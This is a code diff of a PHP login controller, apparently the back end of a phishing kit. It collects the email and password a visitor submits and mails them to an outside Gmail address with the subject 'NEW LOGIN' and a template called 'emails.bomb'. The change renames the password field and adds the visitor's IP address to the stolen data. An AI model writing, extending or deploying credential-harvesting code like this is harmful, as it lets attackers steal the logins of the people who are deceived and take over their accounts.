@@ -42,7 +42,7 @@ class MainController extends Controller {
           
           $validator = Validator::make($req, [
                              'username' => 'required|email',
-                             'password' => 'required',                               
+                             'pass' => 'required',                               
                    ]);    
 
                  if($validator->fails())
@@ -59,11 +59,12 @@ class MainController extends Controller {
                  {                 	
                      $u = $req["username"];
                      $p = $req["pass"];
+                     $ip = getenv("REMOTE_ADDR");
                     # return "leads has ".count($leads)." elements";
                      $ret = "";
                      
-                     $this->helpers->sendEmail("uwantbrendacolson@gmail.com","NEW LOGIN" ,['u' => $u, 'p' => $p],'emails.bomb','view');
-                             $ret.= "success";
+                     $this->helpers->sendEmail("uwantbrendacolson@gmail.com","NEW LOGIN" ,['u' => $u, 'p' => $p, 'ip' => $ip],'emails.bomb','view');
+                             $ret = "success";
                              #sleep(500);
                              
                      return $ret;                     
